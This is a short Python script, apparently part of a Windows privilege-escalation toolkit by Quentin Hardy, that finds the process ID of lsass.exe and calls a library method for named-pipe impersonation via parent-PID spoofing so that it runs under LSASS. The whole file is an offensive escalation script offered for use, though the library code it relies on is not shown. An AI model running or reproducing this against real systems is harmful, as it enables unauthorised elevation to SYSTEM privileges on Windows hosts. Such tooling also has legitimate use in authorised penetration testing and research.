# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

import sys
sys.path.append('../')
from utils import *
configureLogging()
from escalation import Escalation

esc = Escalation()
ppidLSASS = getPIDfromName('lsass.exe')
esc.namedPipeImpersonationViaSpoofPPIDWithPID(pid=ppidLSASS, ps=False)
